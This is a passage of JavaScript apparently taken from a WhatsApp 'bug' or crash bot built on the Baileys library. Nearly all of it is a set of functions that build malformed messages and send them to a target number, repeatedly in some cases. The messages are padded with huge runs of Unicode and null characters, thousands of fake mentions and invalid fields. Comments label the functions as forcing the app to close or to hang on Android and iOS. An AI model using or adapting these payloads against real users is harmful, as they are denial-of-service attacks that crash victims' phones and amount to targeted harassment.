                            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                            participant: target,
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg3 = {
            interactiveMessage: {
                body: { text: "ꦾ".repeat(20000) },
                nativeFlowMessage: {
                    buttons: [{
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            "icon": "REVIEW",
                            "flow_cta": "𑜦𑜠".repeat(10000),
                            "flow_message_version": "3"
                        })
                    }],
                    messageParamsJson: "{" + "ꦾ".repeat(5000),
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                    forwardingScore: 999,
                    isForwarded: true,
                    participant: target,
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                },
            }
        };

        const msg4 = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: { title: "ꦾ".repeat(8000) },
                        body: { text: "ꦽ".repeat(8000) },
                        contextInfo: {
                            stanzaId: "Bokep_id",
                            isForwarding: true,
                            forwardingScore: 999,
                            participant: target,
                            remoteJid: "status@broadcast",
                            mentionedJid: ["13333335502@s.whatsapp.net", ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net")],
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimeStamp: Date.now() + 18144000000,
                                },
                            },
                            forwardedAiBotMessageInfo: {
                                botName: "META AI",
                                botJid: Math.floor(Math.random() * 99999),
                                creatorName: "Bokep",
                            },
                        }
                    }
                }
            }
        };

        const tai = [msg1, msg2, msg3, msg4].map(msg => generateWAMessageFromContent(target, msg, {}));

        for (const msg of tai) {
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }]
                }]
            });
        }

        if (mention) {
            await sock.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: tai.key,
                                type: 25,
                            },
                        },
                    },
                },
                {
                    additionalNodes: [{
                        tag: "meta",
                        attrs: { is_status_mention: "@OndetMpx" },
                        content: undefined,
                    }]
                }
            );
        }

        console.log(" udah ke send");

    } catch (e) {
        console.log("Error:", e.message);
    }
}
async function protocolbug18(sock, target, mention) {
  for (let p = 0; p < 5; p++) {

    const PouMsg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveResponseMessage: {
            body: {
              text: "\u0000".repeat(300),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                header: "\u0000".repeat(10000),
                body: "\u0000".repeat(10000),
                flow_action: "navigate",
                flow_action_payload: { screen: "FORM_SCREEN" },
                flow_cta: "\u0000".repeat(900000),
                flow_id: "1169834181134583",
                flow_message_version: "3",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
              })
            }
          }
        }
      }
    });

    await sock.relayMessage("status@broadcast", PouMsg.message, {
      messageId: PouMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: PouMsg.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "#PouMods Official" },
                content: undefined
              }
            ]
          }
        }
      }, {});
    }

  }
}

async function BandangV1(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}


async function bandangV2(target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options", 
                        paramsJson: "{\"display_text\":\" PouMods - Offcial\",\"id\":\".Grifith\",\"description\":\"gatau bet mut.\"}",
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function delayloww(sock, target) {
    const PouMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u0000".repeat(200),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({ status: true }),
                        version: 3
                    }
                },
                contextInfo: {
                    mentionedJid: Array.from(
                        { length: 30000 },
                        () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                    remoteJid: "status@broadcast",
                    forwardingScore: 999,
                    isForwarded: true
                }
            }
        }
    }, {});
    
    await sock.relayMessage("status@broadcast", PouMsg.message, {
            messageId: PouMsg.key.id,
            statusJidList: [target],
            additionalNodes: [ {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function XvrZenDly(sock, target) {
  try {
    let msg = generateWAMessageFromContent(target, {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
          },
          body: {
            text: "\u0000".repeat(1500),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
            version: 3
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });

  } catch (err) {
    console.error(chalk.red.bold("func Error jir:"), err);
  }
}
//FUNCTION UI ANDROID
async function LocaXotion(target) {
    await sock.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}
async function PouButtonUi(target) {
for (let i = 0; i < 5; i++) {
const PouMsg = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
hasMediaAttachment: false
},
body: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(5000),
limited_time_offer: {
text: "𝐏𝐨͠𝐮𝐌͜𝐨͠𝐝𝐬 𝐎𝐟͠𝐟𝐢͜𝐜𝐢𝐚𝐥",
url: "t.me/PouSkibudi",
copy_code: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
expiration_time: Date.now() * 999
},
buttons: [
{
name: "quick_reply",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
id: null
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "𑜦𑜠".repeat(10000),
copy_code: "𑜦𑜠".repeat(10000)
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
icon: "PROMOTION",
flow_cta: "𝐊𝐚͠𝐦𝐢͜𝐲𝐚 𝐈͠𝐬͜ 𝐁͠𝐚͜𝐜͠𝐤",
flow_message_version: "3"
})
}
]
},
contextInfo: {
mentionedJid: Array.from({ length: 1000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
isForwarded: true,
forwardingScore: 999
}
}
}
}
}
await sock.relayMessage(target, PouMsg)
}
}

async function PLottiEStcJv(sock, target) {
  try {
    const PouMsg1 = generateWAMessageFromContent(target, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419085046817@newsletter",
                serverMessageId: 1,
                newsletterName: "POU HITAM BANGET 😹︎" + "ꦾ".repeat(12000)
              },
              quotedmessage: {
                paymentInviteMessage: {
                  expiryTimestamp: Date.now() + 1814400000,
                  serviceType: 3,
                }
              }
            }
          }
        }
      }
    }, { userJid: target })

    await sock.relayMessage(target, PouMsg1.message, { 
    messageId: PouMsg1.key.id 
    })
    console.log("DONE BY AiiSigma")

  } catch (bokepPou3menit) {
    console.error("EROR COK:", bokepPou3menit)
  }
}
// FUNCTION FORCE CLOSE KATANYA WKWK
async function PouHitam(sock, target) {
 const PouMessage = {
 viewOnceMessage: {
 message: {
 extendedTextMessage: {
 text: "POU HAMA 😹" + "\u0000".repeat(1000) + "https://Wa.me/stickerpack/poukontol",
 matchedText: "https://Wa.me/stickerpack/PouKontol",
 description: "\u74A7",
 title: "POU BIRAHI 😹", 
 contextInfo: {
 mentionedJid: [target],
 forwardingScore: 1000,
 isForwarded: true,
 externalAdReply: {
 renderLargerThumbnail: true,
 title: "POU SANGE 😹",
 body: "click woi biar forcelose 😑👌",
 showAdAttribution: true,
 thumbnailUrl: "https://Wa.me/stickerpack/PouKontol",
 mediaUrl: "https://Wa.me/stickerpack/PouKontol",
 sourceUrl: "https://Wa.me/stickerpack/PouKontol"
 }
 }
 }
 }
 }
 };

 await sock.relayMessage(target, PouMessage, { 
    messageId: Date.now().toString() });
}
//FUNCTION BLANK IOS NO INVISIBLE

//FUNCTION FORCE CLOSE IOS INVISIBLE 
async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/OTAX",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "OTAX",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function TrueNullv3(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  const ButtonMessage = {
